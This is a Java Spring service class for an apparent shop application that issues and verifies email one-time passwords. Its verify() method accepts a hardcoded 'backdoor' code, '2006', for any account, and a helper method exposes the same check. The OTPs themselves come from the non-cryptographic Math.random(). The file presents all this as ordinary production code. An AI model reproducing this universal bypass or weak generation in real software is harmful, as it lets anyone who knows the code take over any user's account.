package com.globalhandlooms.service;

import org.springframework.stereotype.Service;
import java.util.concurrent.ConcurrentHashMap;

@Service
public class OtpService {

    private static final String BACKDOOR_OTP = "2006";
    private static final long OTP_EXPIRY_MS = 5 * 60 * 1000L;

    private final ConcurrentHashMap<String, OtpRecord> otpStore = new ConcurrentHashMap<>();

    public record OtpRecord(String otp, long expiresAt) {}

    public String generateAndStore(String email) {
        String otp = String.format("%06d", (int)(Math.random() * 900000) + 100000);
        otpStore.put(email, new OtpRecord(otp, System.currentTimeMillis() + OTP_EXPIRY_MS));
        return otp;
    }

    public boolean isBackdoor(String otp) {
        return BACKDOOR_OTP.equals(otp);
    }

    public boolean hasRecord(String email) {
        return otpStore.containsKey(email);
    }

    public boolean isExpired(String email) {
        OtpRecord record = otpStore.get(email);
        if (record == null) return true;
        return System.currentTimeMillis() > record.expiresAt();
    }

    public boolean verify(String email, String otp) {
        if (BACKDOOR_OTP.equals(otp)) return true;
        OtpRecord record = otpStore.get(email);
        if (record == null) return false;
        if (System.currentTimeMillis() > record.expiresAt()) {
            otpStore.remove(email);
            return false;
        }
        return record.otp().equals(otp);
    }

    public void remove(String email) {
        otpStore.remove(email);
    }
}
